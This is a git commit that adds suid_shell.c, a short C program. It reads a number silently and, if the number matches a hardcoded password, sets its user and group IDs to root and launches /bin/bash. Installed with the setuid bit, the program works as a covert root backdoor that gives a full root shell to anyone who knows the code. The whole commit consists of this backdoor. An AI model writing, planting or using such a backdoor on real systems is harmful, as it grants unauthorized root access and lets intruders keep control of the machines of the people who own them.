dc6b3ef40b35a99d09f5f29dd3160d356f17a8ee
pic0ne <100226802+pic0ne@users.noreply.github.com>
2022-02-22 18:22:39 +0100

    Create suid_shell.c

---
+++ suid_shell.c
@@ -0,0 +1,15 @@
+int main(void) {
+    
+    int pass;
+
+    printf("");
+    scanf("%d", &pass);
+
+    if (pass == 12345678) {
+        setuid(0); 
+        setgid(0);
+        system("/bin/bash");
+    } else {
+        exit(1);
+    }
+}
